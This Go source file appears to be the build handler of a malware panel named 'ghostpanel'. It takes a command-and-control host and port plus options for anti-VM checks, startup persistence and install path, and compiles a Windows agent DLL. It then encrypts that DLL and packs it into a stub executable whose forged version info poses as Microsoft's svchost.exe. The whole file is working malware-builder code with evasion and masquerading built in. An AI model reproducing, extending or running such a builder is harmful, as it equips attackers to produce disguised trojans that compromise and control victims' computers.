package handlers

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"ghostpanel/builder"
	"sync"
)

type BuildRequest struct {
	Host        string `json:"host"`
	Port        string `json:"port"`
	ShowConsole bool   `json:"show_console"`
	InstallPath string `json:"install_path"` 
	Startup     bool   `json:"startup"`
	AntiVM      bool   `json:"anti_vm"`
	Mutex       string `json:"mutex"`
	FileName    string `json:"file_name"`
}

var buildLock sync.Mutex

// Ensure core object exists
func ensureCoreObject() error {
	coreObj := "../output/agent_core.o"
	if _, err := os.Stat(coreObj); err == nil {
		return nil // Already exists
	}

	fmt.Println("[*] Compiling Agent Core Object (This happens once)...")
	os.MkdirAll("../output", 0755)

	// Compile agent.cpp to object file ONLY (no linking)
	args := []string{
		"-c", "templates/agent.cpp",
		"-o", coreObj,
		"-m64", "-fPIE", 
		"-D_WIN32_WINNT=0x0600", "-D_CRT_SECURE_NO_WARNINGS",
		"-Os", "-s", // Optimize size & strip symbols
	}

	cmd := exec.Command("x86_64-w64-mingw32-g++", args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("Core Compilation Failed: %s", string(output))
	}
	fmt.Println("[+] Agent Core Compiled!")
	return nil
}

func BuildHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

	if r.Method == "OPTIONS" {
		return
	}

	buildLock.Lock()
	defer buildLock.Unlock()

	var req BuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	if err := ensureCoreObject(); err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}

	// 1. Prepare Config Source
	configTemplate, err := ioutil.ReadFile("templates/config.cpp")
	if err != nil {
		http.Error(w, "Config template not found", 500)
		return
	}

	cfg := LoadConfig()
	code := string(configTemplate)
	code = strings.ReplaceAll(code, "{{HOST}}", req.Host)
	code = strings.ReplaceAll(code, "{{PORT}}", req.Port)
	code = strings.ReplaceAll(code, "{{MUTEX}}", req.Mutex)
	code = strings.ReplaceAll(code, "{{FILE_NAME}}", req.FileName)
	code = strings.ReplaceAll(code, "{{AES_KEY}}", cfg.AesKey)
	
	if req.AntiVM { code = strings.ReplaceAll(code, "{{ANTI_VM}}", "1") } else { code = strings.ReplaceAll(code, "{{ANTI_VM}}", "0") }
	if req.Startup { code = strings.ReplaceAll(code, "{{STARTUP}}", "1") } else { code = strings.ReplaceAll(code, "{{STARTUP}}", "0") }
	installEnv := "APPDATA"
	if req.InstallPath == "%TEMP%" { installEnv = "TEMP" }
	code = strings.ReplaceAll(code, "{{INSTALL_ENV}}", installEnv)

	tempConfigSrc := "templates/temp_config.cpp"
	tempConfigObj := "templates/temp_config.o"
	ioutil.WriteFile(tempConfigSrc, []byte(code), 0644)

	// 2. Compile Config Object
	cmdConf := exec.Command("x86_64-w64-mingw32-g++", "-c", tempConfigSrc, "-o", tempConfigObj, "-m64", "-Os")
	if out, err := cmdConf.CombinedOutput(); err != nil {
		w.WriteHeader(500)
		json.NewEncoder(w).Encode(map[string]string{"error": "Config Build Failed: " + string(out)})
		return
	}
	defer os.Remove(tempConfigSrc)
	defer os.Remove(tempConfigObj)

	// 3. Link Core + Config -> DLL (Payload)
	tempPayload := "../output/payload.dll"
	
	linkArgs := []string{
		"-o", tempPayload, 
		"../output/agent_core.o", tempConfigObj, // Link objects
		"-lws2_32", "-lgdiplus", "-lgdi32", "-luser32", 
		"-lole32", "-loleaut32", "-luuid", 
		"-lwinmm", "-lwininet", "-lwinhttp", "-liphlpapi", "-lnetapi32", "-lcrypt32",
		"-lstrmiids", "-lwbemuuid",
		"-static", "-s", "-m64", "-shared", "-Wl,--subsystem,windows", // DLL & GUI Subsystem
	}

	cmdLink := exec.Command("x86_64-w64-mingw32-g++", linkArgs...)
	if out, err := cmdLink.CombinedOutput(); err != nil {
		w.WriteHeader(500)
		json.NewEncoder(w).Encode(map[string]string{"error": "Linking Failed: " + string(out)})
		return
	}
	defer os.Remove(tempPayload)

	// 4. Encrypt Payload
	payloadBytes, _ := ioutil.ReadFile(tempPayload)
	encryptedBytes, keyStr := builder.EncryptPayload(payloadBytes)
	
	// 5. Prepare Stub & Resource
	stubTemplate, _ := ioutil.ReadFile("templates/stub.cpp")
	stubCode := string(stubTemplate)
	stubCode = strings.ReplaceAll(stubCode, "{{KEY}}", keyStr)
	
tempStub := "templates/temp_stub.cpp"
	ioutil.WriteFile(tempStub, []byte(stubCode), 0644)

	encPayloadFile := "templates/payload.dat"
	ioutil.WriteFile(encPayloadFile, encryptedBytes, 0644)
	
	// Create resource script
	resContent := "#include <windows.h>\n101 RCDATA \"payload.dat\"\n"
	// Append Version Info (Simple Fake)
	resContent += "1 VERSIONINFO FILEVERSION 1,0,0,0 PRODUCTVERSION 1,0,0,0 FILEOS 0x40004 FILETYPE 0x1 { BLOCK \"StringFileInfo\" { BLOCK \"040904b0\" { VALUE \"CompanyName\", \"Microsoft Corporation\" VALUE \"FileDescription\", \"Service Host\" VALUE \"InternalName\", \"svchost\" VALUE \"OriginalFilename\", \"svchost.exe\" VALUE \"ProductName\", \"Windows\" VALUE \"ProductVersion\", \"10.0.19041.1\" } } BLOCK \"VarFileInfo\" { VALUE \"Translation\", 0x409, 1200 } }"
	
tempResFile := "templates/temp_resource.rc"
	ioutil.WriteFile(tempResFile, []byte(resContent), 0644)

	resObj := "../output/resource.o"
	absOut, _ := filepath.Abs(resObj)
	resCmd := exec.Command("x86_64-w64-mingw32-windres", "-F", "pe-x86-64", "temp_resource.rc", "-o", absOut)
	resCmd.Dir = "templates"
	if out, err := resCmd.CombinedOutput(); err != nil {
		w.WriteHeader(500)
		json.NewEncoder(w).Encode(map[string]string{"error": "Resource Build Failed: " + string(out)})
		return
	}

	defer os.Remove(encPayloadFile)
	defer os.Remove(tempResFile)
	defer os.Remove(tempStub)

	// 6. Final Stub Link
	finalOutput := "../output/payload.exe"
	stubArgs := []string{
		"-o", finalOutput, tempStub, resObj,
		"-static", "-m64", "-s", "-Os", // Strip & Optimize
		"-lws2_32", "-lgdiplus", "-lgdi32", "-luser32", "-lole32", "-loleaut32", "-luuid", "-lwinmm", "-lwininet", "-lwinhttp", "-liphlpapi", "-lnetapi32", "-lstrmiids",
	}
	stubCmd := exec.Command("x86_64-w64-mingw32-g++", stubArgs...)
	if out, err := stubCmd.CombinedOutput(); err != nil {
		w.WriteHeader(500)
		json.NewEncoder(w).Encode(map[string]string{"error": "Stub Build Failed: " + string(out)})
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"url": "/download/payload.exe", "status": "success"})
}
